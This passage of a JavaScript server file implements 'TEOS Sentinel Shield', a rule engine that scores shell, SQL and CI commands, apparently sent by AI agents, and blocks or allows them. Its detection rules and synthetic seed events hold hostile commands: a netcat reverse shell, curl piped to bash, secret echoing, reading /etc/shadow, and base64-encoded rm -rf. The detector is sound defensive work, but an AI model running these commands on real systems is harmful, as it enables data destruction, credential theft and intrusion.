  { id:'R24', name:'DATA_EXFIL_CURL',      sev:'high',     score:88,
    test: c => /curl.+(-d|--data).+\/etc\/(passwd|shadow|hosts)/i.test(c),
    reasons: ['Exfiltrating sensitive system files via curl'] },

  { id:'R25', name:'CI_SECRETS_DUMP',      sev:'critical', score:90,
    test: c => /printenv|env\s*\|\s*grep|\$\{\{\s*secrets\s*\}\}/i.test(c),
    reasons: ['CI secrets or environment dump detected'] },
];

function runEngine(command) {
  if (!command || typeof command !== 'string') {
    return { verdict:'ERROR', score:0, rule:'R00.CLEAN', reasons:['No command provided'] };
  }

  const cmd = command.trim();
  if (cmd.length > 10000) {
    return { verdict:'ERROR', score:0, rule:'R00.CLEAN', reasons:['Input exceeds 10KB limit'] };
  }

  let topHit = null;

  for (const rule of RULES) {
    if (rule.test(cmd)) {
      if (!topHit || rule.score > topHit.score) {
        topHit = { rule, score: rule.score };
      }
    }
  }

  if (topHit) {
    const verdict = topHit.score >= 80 ? 'BLOCK' : 'WARN';
    return {
      verdict,
      score:    topHit.score,
      rule:     `${topHit.rule.id}.${topHit.rule.name}`,
      ruleId:   topHit.rule.id,
      severity: topHit.rule.sev,
      reasons:  topHit.rule.reasons,
      command:  cmd,
      timestamp: new Date().toISOString(),
    };
  }

  return {
    verdict:   'ALLOW',
    score:     0,
    rule:      'R00.CLEAN',
    ruleId:    'R00',
    severity:  'none',
    reasons:   ['No threat patterns detected across 25 rules','Safe to execute'],
    command:   cmd,
    timestamp: new Date().toISOString(),
  };
}

// ── SYNTHETIC SEED DATA (credible operational realism) ──────
const SEED_EVENTS = [
  { id: 1715140800000, timestamp: '2024-05-08T02:13:20Z', verdict: 'BLOCK', score: 100, rule: 'R01.DESTRUCTIVE_SHELL', ruleId: 'R01', severity: 'critical', command: 'rm -rf /var/log/*', type: 'shell', agentId: 'ci-runner-prod', reasons: ['rm -rf permanently destroys filesystem data'] },
  { id: 1715140860000, timestamp: '2024-05-08T02:14:20Z', verdict: 'BLOCK', score: 95, rule: 'R03.CURL_EXEC_CHAIN', ruleId: 'R03', severity: 'critical', command: 'curl https://setup.example.com/install.sh | bash', type: 'shell', agentId: 'deploy-agent', reasons: ['curl piped to shell executes untrusted remote code'] },
  { id: 1715141200000, timestamp: '2024-05-08T02:20:00Z', verdict: 'ALLOW', score: 0, rule: 'R00.CLEAN', ruleId: 'R00', severity: 'none', command: 'npm run build', type: 'shell', agentId: 'ci-runner-staging', reasons: ['No threat patterns detected'] },
  { id: 1715141500000, timestamp: '2024-05-08T02:25:00Z', verdict: 'WARN', score: 75, rule: 'R09.SQL_DESTRUCTION', ruleId: 'R09', severity: 'high', command: 'DROP TABLE IF EXISTS users;', type: 'sql', agentId: 'migration-bot', reasons: ['SQL DROP command permanently destroys data'] },
  { id: 1715142000000, timestamp: '2024-05-08T02:33:20Z', verdict: 'BLOCK', score: 90, rule: 'R04.SECRET_ECHO', ruleId: 'R04', severity: 'critical', command: 'echo $AWS_SECRET_ACCESS_KEY', type: 'shell', agentId: 'debug-agent', reasons: ['Echoing secret environment variable'] },
  { id: 1715142600000, timestamp: '2024-05-08T02:43:20Z', verdict: 'BLOCK', score: 100, rule: 'R08.REVERSE_SHELL', ruleId: 'R08', severity: 'critical', command: 'nc -e /bin/bash 10.0.0.5 4444', type: 'shell', agentId: 'unknown', reasons: ['Reverse shell connection attempt detected'] },
  { id: 1715143200000, timestamp: '2024-05-08T02:53:20Z', verdict: 'ALLOW', score: 0, rule: 'R00.CLEAN', ruleId: 'R00', severity: 'none', command: 'console.log("health check ok")', type: 'shell', agentId: 'monitor-agent', reasons: ['No threat patterns detected'] },
  { id: 1715143800000, timestamp: '2024-05-08T03:03:20Z', verdict: 'BLOCK', score: 88, rule: 'R07.BASE64_EXEC', ruleId: 'R07', severity: 'high', command: 'eval(atob("cm0gLXJmIC8="))', type: 'shell', agentId: 'llm-worker', reasons: ['Base64-encoded payload executed via eval'] },
  { id: 1715144400000, timestamp: '2024-05-08T03:13:20Z', verdict: 'WARN', score: 65, rule: 'R16.UNSAFE_PERMISSIONS', ruleId: 'R16', severity: 'medium', command: 'permissions: write-all', type: 'ci', agentId: 'github-actions', reasons: ['GitHub Actions write-all permissions overly broad'] },
  { id: 1715145000000, timestamp: '2024-05-08T03:23:20Z', verdict: 'BLOCK', score: 90, rule: 'R13.PRIVILEGE_ESCALATION', ruleId: 'R13', severity: 'critical', command: 'sudo bash -c "cat /etc/shadow"', type: 'shell', agentId: 'priv-escalation-test', reasons: ['Privilege escalation via sudo or SUID abuse'] },
  { id: 1715145600000, timestamp: '2024-05-08T03:33:20Z', verdict: 'BLOCK', score: 85, rule: 'R14.MALICIOUS_PACKAGE', ruleId: 'R14', severity: 'high', command: 'npm install event-stream@3.3.6', type: 'deps', agentId: 'dependency-bot', reasons: ['Known malicious npm package version detected'] },
  { id: 1715146200000, timestamp: '2024-05-08T03:43:20Z', verdict: 'ALLOW', score: 0, rule: 'R00.CLEAN', ruleId: 'R00', severity: 'none', command: 'docker-compose up -d', type: 'shell', agentId: 'deploy-agent', reasons: ['No threat patterns detected'] },
];

async function seedData() {
  if (!redis) {
    log('info', 'Redis not available, using memory store');
    if (memStore.length === 0) {
      memStore = [...SEED_EVENTS];
      log('info', 'Synthetic seed data loaded into memory', { count: SEED_EVENTS.length });
    }
    return;
  }

  try {
    const count = await redis.llen(REDIS_KEY);
    
    if (count === 0) {
      const seedJson = SEED_EVENTS.map(e => JSON.stringify(e));
      await redis.lpush(REDIS_KEY, ...seedJson);
      log('info', 'Synthetic seed data loaded into Redis', { count: SEED_EVENTS.length });
    } else {
      log('info', 'Redis already has events, skipping seed', { count });
    }
  } catch (e) {
    log('warn', 'Redis seed failed', { error: e.message });
    if (memStore.length === 0) {
      memStore = [...SEED_EVENTS];
    }
  }
}

async function initBootTime() {
  if (!redis) return;
  try {
    const existing = await redis.get(BOOT_KEY);
    if (!existing) {
      await redis.set(BOOT_KEY, Date.now().toString());
      log('info', 'Boot time initialized in Redis');
    }
  } catch (e) {
    log('warn', 'Boot time init failed', { error: e.message });
  }
}

seedData();
initBootTime();

// ── ROUTES ──────────────────────────────────────────────────

// GET /health
app.get('/health', async (req, res) => {
  let uptime = process.uptime();
  let eventCount = 0;
  let storeStatus = redis ? 'redis' : 'memory';
  let postgresHealthy = false;

  try {
    if (redis) {
      await redis.ping();
      eventCount = await redis.llen(REDIS_KEY);
      
      const bootTime = await redis.get(BOOT_KEY);
      if (bootTime) {
        uptime = (Date.now() - parseInt(bootTime)) / 1000;
      }
    } else {
      eventCount = memStore.length;
    }
  } catch (e) {
    log('warn', 'Redis health check failed', { error: e.message });
    storeStatus = 'redis_error';
    eventCount = memStore.length;
  }

  try {
    if (supabase) {
      const { error } = await supabase.from('audit_logs').select('id').limit(1);
      postgresHealthy = !error;
    }
  } catch (e) {
    log('warn', 'Supabase health check failed', { error: e.message });
  }

  const overallStatus = (storeStatus !== 'redis_error' && postgresHealthy) ? 'online'
    : (storeStatus !== 'redis_error' || postgresHealthy) ? 'degraded' : 'critical';

  res.json({
    status:         overallStatus,
    engine:         'v2.4',
    rules:          RULES.length,
    uptime:         Math.round(uptime),
    uptimeHuman:    uptime > 86400 ? `${Math.floor(uptime/86400)}d` :
                    uptime > 3600  ? `${Math.floor(uptime/3600)}h` :
                                     `${Math.floor(uptime/60)}m`,
    env:            NODE_ENV,
    time:           new Date().toISOString(),
    version: '4.0.0-rc1',
    store:          storeStatus,
    eventsCount:    eventCount,
    sla:            '99.95%',
    lastDeployment: process.env.VERCEL_GIT_COMMIT_SHA || 'unknown',
    auth:           'x-api-key',
    rateLimiting:   'redis-backed-tiered',
    auditStore:     supabase ? (postgresHealthy ? 'supabase' : 'supabase_unhealthy') : 'redis-fallback',
    sseClients:     sseClients.size,
    webhooks: {
      total:     webhookTotal,
      processed: webhookProcessed,
      failed:    webhookFailed,
    },
    dependencies: {
      redis:  storeStatus !== 'redis_error' ? 'healthy' : 'unhealthy',
      postgres: postgresHealthy ? 'healthy' : (supabase ? 'unhealthy' : 'not_configured'),
    },
  });
});

app.get('/openapi-spec.yaml', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'docs', 'openapi-spec.yaml'));
  });

// GET / (root)
app.get('/', (req, res) => {
  res.json({
    service: 'TEOS Sentinel Shield',
    version: 'v2.3',
    engine:  'deterministic',
    rules:   RULES.length,
    endpoints: ['/scan','/stats','/events','/events/stream','/audit','/health','/enforce','/ledger/verify','/metrics','/audit/summary','/rules.json'],
    auth:    'X-API-Key header required',
    docs:    'https://github.com/teos-sovereign/teos-sentinel-shield',
  });
});

// POST /scan
app.post('/scan', async (req, res) => {
  const body = req.body;
  if (!body || typeof body !== 'object') {
    return res.status(400).json({ error: 'invalid_request', message: 'JSON body required' });
  }

  const input = (body.command || body.cmd || '').toString();
  const type  = (body.type || 'shell').toString().slice(0, 32);

  if (!input.trim()) {
    return res.status(400).json({
      error: 'missing_command',
      message: 'Provide a "command" or "cmd" field in the request body',
    });
  }

  const result = runEngine(input);
  result.type  = type;
  result.reqId = req.id;
  result.tier  = req.apiTier;

  const commandHash = crypto.createHash('sha256').update(input).digest('hex');

  // Persist to Redis (or memory)
  await saveEvent({ id: Date.now(), ...result, commandHash });

  // Persist to Supabase (async, never block response)
  writeAuditLog({
    requestId: req.id,
    userId: req.apiKey?.slice(0, 8) || 'anonymous',
    timestamp: new Date().toISOString(),
    verdict: result.verdict,
    ruleId: result.ruleId,
    rule: result.rule,
    score: result.score,
    commandHash,
    type,
    tier: req.apiTier,
    agentId: result.agentId,
    severity: result.severity,
    reasons: result.reasons,
    command: input,
  }).catch(() => {});

  // Broadcast via SSE
  broadcastEvent({
    type: 'scan',
    requestId: req.id,
    timestamp: new Date().toISOString(),
    verdict: result.verdict,
    ruleId: result.ruleId,
    riskScore: result.score,
    tier: req.apiTier,
  });

  res.json(result);
});

// GET /stats
app.get('/stats', async (req, res) => {
  const events  = await loadEvents();
  const total   = events.length;
  const blocked = events.filter(e => e.verdict === 'BLOCK').length;
  const warned  = events.filter(e => e.verdict === 'WARN').length;
  const allowed = events.filter(e => e.verdict === 'ALLOW').length;
  const blockRate = total > 0 ? ((blocked / total) * 100).toFixed(1) : '0.0';

  const ruleCounts = {};
  events.forEach(e => {
    if (e.ruleId) ruleCounts[e.ruleId] = (ruleCounts[e.ruleId] || 0) + 1;
  });
  const topRules = Object.entries(ruleCounts)
    .sort((a,b) => b[1] - a[1])
    .slice(0, 10)
    .map(([id, count]) => ({ id, count }));

  res.json({
    total,
    blocked,
    warned,
    allowed,
    blockRate,
    topRules,
    rulesActive: RULES.length,
    generated: new Date().toISOString(),
  });
});

// GET /events
app.get('/events', async (req, res) => {
  const events = await loadEvents();
  const page   = Math.max(1, parseInt(req.query.page)  || 1);
  const limit  = Math.min(500, Math.max(1, parseInt(req.query.limit) || 100));
  const verdict = req.query.verdict;
  const ruleId  = req.query.ruleId;

  let filtered = events;
  if (verdict) filtered = filtered.filter(e => e.verdict?.toLowerCase() === verdict.toLowerCase());
  if (ruleId)  filtered = filtered.filter(e => e.ruleId === ruleId.toUpperCase());

  const total  = filtered.length;
  const sorted = [...filtered].reverse();
  const sliced = sorted.slice((page-1)*limit, page*limit);

  res.json({ total, page, limit, events: sliced, sseEndpoint: '/events/stream' });
});

// GET /audit
app.get('/audit', async (req, res) => {
  const { verdict, ruleId, limit = 200, offset = 0, startDate, endDate, export: exportFormat } = req.query;

  if (supabase || redis) {
    const result = await queryAuditLogs({
      verdict: verdict?.toUpperCase(),
      ruleId: ruleId?.toUpperCase(),
      limit: Math.min(parseInt(limit), 1000),
      offset: parseInt(offset),
      startDate: startDate ? new Date(startDate).toISOString() : undefined,
      endDate: endDate ? new Date(endDate).toISOString() : undefined,
    });

    if (exportFormat === 'csv') {
      const csv = [
        'timestamp,verdict,ruleId,ruleName,riskScore,requestId,commandHash',
        ...result.entries.map(e =>
          `${e.timestamp},${e.verdict},${e.rule_id || e.ruleId},${e.rule_name || e.rule},${e.risk_score || e.score},${e.request_id || e.reqId},${e.command_hash || ''}`
        ),
      ].join('\n');

      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename="teos-audit-log.csv"');
      return res.send(csv);
    }

    return res.json({
      ...result,
      generated: new Date().toISOString(),
    engine: 'TEOS Sentinel v2.4',
    });
  }

  // Pure memory fallback
  const events = await loadEvents();
  res.json({
    generated:   new Date().toISOString(),
    engine:      'TEOS Sentinel 4.0.0-rc1',
      version: '4.0.0-rc1',
    rulesActive: RULES.length,
    totalEvents: events.length,
    events:      events.slice(-200).reverse(),
    store:       'memory',
  });
});

// GET /audit/summary — aggregated statistics
app.get('/audit/summary', async (req, res) => {
  const days = Math.min(365, Math.max(1, parseInt(req.query.days) || 30));
  const summary = await getAuditSummary(days);

  res.json({
    ...summary,
    generated: new Date().toISOString(),
    engine: 'TEOS Sentinel v2.3',
  });
});

// POST /enforce — runtime interception layer
app.post('/enforce', async (req, res) => {
  const body = req.body;
  if (!body || typeof body !== 'object') {
    return res.status(400).json({ error: 'invalid_request', message: 'JSON body required' });
  }

  const agentId = (body.agentId || body.agent || 'unknown').toString().slice(0, 128);
  const action  = (body.action || body.command || body.cmd || '').toString();

  if (!action.trim()) {
    return res.status(400).json({
      error: 'missing_action',
      message: 'Provide an "action", "command", or "cmd" field in the request body',
    });
  }

  const result = runEngine(action);

  const verdict = result.verdict;
  const executionAllowed = verdict === 'ALLOW';

  const response = {
    verdict,
    executionAllowed,
    ruleId: result.rule,
    riskScore: result.score,
    severity: result.severity,
    reasons: result.reasons,
    agentId,
    action: action.trim(),
    timestamp: new Date().toISOString(),
    engine: 'v2.4',
    tier: req.apiTier,
    reqId: req.id,
  };

  const commandHash = crypto.createHash('sha256').update(action).digest('hex');

  // Persist enforcement decision
  await saveEvent({ id: Date.now(), type: 'enforce', agentId, apiKey: req.apiKey.slice(0, 8) + '...', ...result, commandHash });

  // Persist to Supabase (async, never block response)
  writeAuditLog({
    requestId: req.id,
    userId: req.apiKey?.slice(0, 8) || 'anonymous',
    timestamp: new Date().toISOString(),
    verdict,
    ruleId: result.ruleId,
    rule: result.rule,
    score: result.score,
    commandHash,
    type: 'enforce',
    tier: req.apiTier,
    agentId,
    severity: result.severity,
    reasons: result.reasons,
    command: action,
  }).catch(() => {});

  // Broadcast via SSE
  broadcastEvent({
    type: 'enforce',
    requestId: req.id,
    timestamp: new Date().toISOString(),
    verdict,
    executionAllowed,
    ruleId: result.ruleId,
    riskScore: result.score,
    agentId,
    tier: req.apiTier,
  });

  res.json(response);
});

// GET /ledger/verify — audit trail verification
app.get('/ledger/verify', async (req, res) => {
  const events = await loadEvents();
  const limit  = Math.min(50, Math.max(1, parseInt(req.query.limit) || 20));
  const recent = events.slice(-limit).reverse();

  const ledger = recent.map(e => ({
    id: e.id,
    timestamp: e.timestamp,
    verdict: e.verdict,
    ruleId: e.rule,
    score: e.score,
    severity: e.severity,
    command: e.command?.slice(0, 200),
    agentId: e.agentId || null,
    type: e.type || 'scan',
    hash: crypto.createHash('sha256').update(`${e.id}-${e.timestamp}-${e.verdict}-${e.rule}`).digest('hex').slice(0, 16),
  }));

  res.json({
    generated: new Date().toISOString(),
    engine: 'v2.4',
    totalEvents: events.length,
    entries: ledger,
    verification: {
      algorithm: 'SHA-256',
      note: 'Each entry hash combines id + timestamp + verdict + ruleId for tamper detection',
    },
  });
});

// GET /metrics — prometheus-style metrics
app.get('/metrics', async (req, res) => {
  const events = await loadEvents();
  const total  = events.length;
  const blocked = events.filter(e => e.verdict === 'BLOCK').length;
  const warned  = events.filter(e => e.verdict === 'WARN').length;
  const allowed = events.filter(e => e.verdict === 'ALLOW').length;
  const uptime = process.uptime();

  const ruleCounts = {};
  events.forEach(e => {
    if (e.ruleId) ruleCounts[e.ruleId] = (ruleCounts[e.ruleId] || 0) + 1;
  });

  const metrics = {
    teos_engine_info: {
      version: '4.0.0-rc1',
      rules: RULES.length,
      store: redis ? 'redis' : 'memory',
      auditStore: supabase ? 'supabase' : 'redis-fallback',
      env: NODE_ENV,
    },
    teos_uptime_seconds: Math.round(uptime),
    teos_scans_total: total,
    teos_scans_blocked: blocked,
    teos_scans_warned: warned,
    teos_scans_allowed: allowed,
    teos_block_rate_percent: total > 0 ? parseFloat(((blocked / total) * 100).toFixed(1)) : 0,
    teos_rules_active: RULES.length,
    teos_rule_hits: ruleCounts,
    teos_timestamp: new Date().toISOString(),
  };

  res.json(metrics);
});

// POST /billing/checkout — create Dodo checkout session
app.post('/billing/checkout', async (req, res) => {
  const { email, name, tier, type, isAnnual } = req.body;
  if (!email || !tier) {
    return res.status(400).json({ error: 'missing_fields', message: 'email and tier are required' });
  }
  if (!TIER_PRICING[tier]) {
    return res.status(400).json({ error: 'invalid_tier', validTiers: Object.keys(TIER_PRICING) });
  }

  const result = await createCheckoutSession({ email, name, tier, type: type || 'monthly', isAnnual: !!isAnnual });
  if (result.error) {
    return res.status(500).json(result);
  }

  res.json(result);
});

// GET /billing/pricing — get all pricing tiers and products
app.get('/billing/pricing', (req, res) => {
  res.json({
    tiers: TIER_PRICING,
    products: Object.keys(DODO_PRODUCTS).filter(k => DODO_PRODUCTS[k]).map(k => ({ key: k, configured: true })),
    currency: 'USD',
    generated: new Date().toISOString(),
  });
});

// GET /billing/usage — get usage stats for current API key
app.get('/billing/usage', async (req, res) => {
  const keyId = await resolveKeyId(req.apiKey);
  if (!keyId) {
    return res.json({ total: 0, blocks: 0, warns: 0, allows: 0, tier: req.apiTier });
  }

  const days = Math.min(365, Math.max(1, parseInt(req.query.days) || 30));
  const stats = await getUsageStats(keyId, days);
  stats.tier = req.apiTier;
  stats.keyId = keyId;

  res.json(stats);
});

// ── ERROR HANDLER ───────────────────────────────────────────
app.use((err, req, res, next) => {
  log('error', 'Unhandled error', { reqId: req.id, error: err.message, stack: err.stack });

  if (err.type === 'entity.too.large') {
    return res.status(413).json({ error: 'payload_too_large', message: `Max ${MAX_PAYLOAD_KB}KB` });
  }
  if (err.status === 400) {
    return res.status(400).json({ error: 'bad_request', message: err.message });
  }

  res.status(500).json({ error: 'internal_error', reqId: req.id });
});

// ── EXPORT (Vercel serverless + Railway) ──────────────────────
module.exports         = app;
module.exports.RULES   = RULES;
module.exports.runEngine = runEngine;
module.exports.loadEvents = loadEventsSync;
module.exports.saveEvent = saveEvent;
module.exports.redis = redis;

// ── START (local dev / Railway) ─────────────────────────────
if (require.main === module) {
  app.listen(PORT, () => {
    log('info', 'TEOS Sentinel Engine v2.4 started', { port: PORT, env: NODE_ENV, store: redis ? 'redis' : 'memory', audit: supabase ? 'supabase' : 'redis-fallback' });
  });
}
